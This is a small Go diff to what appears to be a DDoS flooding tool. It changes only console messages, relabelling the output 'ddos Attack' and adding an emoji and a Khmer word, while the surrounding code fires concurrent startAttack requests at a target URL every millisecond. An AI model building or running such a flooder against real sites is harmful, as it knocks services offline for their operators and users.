@@ -39,12 +39,12 @@ func main() {
 		rand.Seed(time.Now().UnixNano())
 		for i := 0; i < *count; i++ {
 			if i%4 == 0 {
-				fmt.Println("Strike Hit:", i, "Good:", completeCount, "Bad:", errorCount)
+				fmt.Println("ddos Attack  :", i, "Good:", completeCount, "CAT😼:", errorCount)
 			}
 			go startAttack(*attackUrl, *method, data)
 			time.Sleep(time.Millisecond)
 		}
-		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
+		fmt.Println("Done.", "ល្អ: ", completeCount, "Error: ", errorCount)
 	} else {
 		fmt.Println("use -url http://target.com")
 	}
